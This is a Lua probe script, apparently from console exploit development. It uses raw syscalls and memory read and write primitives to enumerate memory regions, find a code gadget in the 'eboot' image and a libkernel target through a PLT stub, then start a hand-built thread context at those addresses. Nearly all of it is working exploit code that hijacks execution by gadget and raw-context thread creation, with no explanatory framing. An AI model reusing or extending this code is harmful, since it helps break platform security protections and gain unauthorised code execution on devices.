-- CRASH_CLASS: HIGH
-- PROBE 616a: child executes libkernel; every read gated on a readable region (no XOM touch)
print("=== PROBE 616a: CHILD LIBKERNEL CALL ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function hi(a) return math.floor((a or 0)/4294967296) end
local function lo(a) return math.floor((a or 0)%4294967296) end
local function hex(a) return string.format("%08X_%08X",hi(a),lo(a)) end

local sc674=mk(674)
local bufp=memory.alloc(0x20000)
local cnt=memory.alloc(4) wd(N(cnt),0)
pcall(function() sc674(U(N(bufp)),uint64(72),uint64(512),U(N(cnt)),uint64(0x40000000),uint64(0)) end)
local okc,cv=pcall(function() return memory.read_dword(N(cnt)) end)
local n = okc and N(cv) or 0
print(string.format("[A] regions=%d",n))

local RS,RE,RP={},{},{}
local function raw(a) local o,v=pcall(function() return memory.read_byte(a) end) if o then return N(v) end return nil end
local function rawd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local function rawq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
for i=0,n-1 do
    local b=N(bufp)+i*72
    RS[i+1]=N(rawq(b)); RE[i+1]=N(rawq(b+8)); RP[i+1]=N(rawd(b+0x18))
end
local function safe(a)
    for k=1,n do
        if a>=RS[k] and a<RE[k] then
            return math.floor(RP[k])%2==1
        end
    end
    return false
end
local function s8(a) if not safe(a) then return nil end return raw(a) end
local function sd(a) if not safe(a) then return nil end return rawd(a) end
local function sq(a) if not safe(a) then return nil end return rawq(a) end

local eboot=nil
local prot5={}
for k=1,n do
    if RP[k]==5 then
        prot5[#prot5+1]=RS[k]
        if RE[k]-RS[k]>0x92C6B then
            local s=RS[k]
            if raw(s+0x92C67)==0x48 and raw(s+0x92C68)==0x89 and raw(s+0x92C69)==0x07 and raw(s+0x92C6A)==0xC3 then eboot=s end
        end
    end
end
print(string.format("[B] prot5=%d eboot=%s",#prot5,hex(eboot or 0)))
if not eboot then
    for _,s in ipairs(prot5) do print("   prot5 "..hex(s)) end
    print("[!] eboot not identified"); return
end
local mover=eboot+0x92C67
local spin=eboot+0x15481
print(string.format("[C] mover=%s spin=%s",hex(mover),hex(spin)))

local target=nil
for _,s0 in ipairs(prot5) do
    local a=s0+0x108
    if raw(a)==0xFF and raw(a+1)==0x25 then
        local d=rawd(a+2)
        if d and d>=0x80000000 then d=d-0x100000000 end
        local slot=a+6+d
        local v=sq(slot)
        if v and v>=0x800000000 and v<0x900000000 then
            target=v
            print(string.format("[D] stub %s slot %s -> %s",hex(a),hex(slot),hex(v)))
        end
    end
end
if not target then print("[!] no PLT stub"); return end

local sc430=mk(430)
local mark=memory.alloc(0x4000)
local ctx=memory.alloc(0x500)
local stack=memory.alloc(0x10000)

local function launch(tag,rip,rax,rdi)
    wq(N(mark),uint64(0x1111111111111111))
    for i=0,0x4FC,4 do wd(N(ctx)+i,0) end
    wq(N(ctx)+0x108,uint64(0x480))
    wd(N(ctx)+0x0d0,0)
    wq(N(ctx)+0x110,uint64(0x10000))
    wq(N(ctx)+0x0c0,uint64(0x43))
    wq(N(ctx)+0x100,uint64(0x3b))
    wq(N(ctx)+0x0e0,U(rip))
    wq(N(ctx)+0x0f8,U(N(stack)+0x10000-8))
    wq(N(ctx)+0x078,U(rax or 0))   -- RAX
    wq(N(ctx)+0x048,U(rdi or 0))   -- RDI
    wq(N(ctx)+0x050,U(0))          -- RSI
    wq(N(ctx)+0x058,U(0))          -- RDX
    wq(N(ctx)+0x060,U(0))          -- RCX
    wq(N(stack)+0x10000-8,U(spin))
    local tid=memory.alloc(16) wq(N(tid),uint64(0))
    local ok,rv=pcall(function() return sc430(U(N(ctx)),U(N(tid)),uint64(0)) end)
    print(string.format("[%s] ok=%s rv=%s",tag,tostring(ok),tostring(ok and N(rv) or "err")))
    for i=1,400 do pcall(function() return memory.read_dword(N(mark)) end) end
    print(string.format("[%s] marker=%s",tag,hex(N(rawq(N(mark))))))
end

print("[S1] child runs an eboot gadget")
launch("S1",mover,0xCAFEBABE,N(mark))
print("[S2] child jumps to the libkernel target")
launch("S2",target,0,0)
print("[Z] alive")
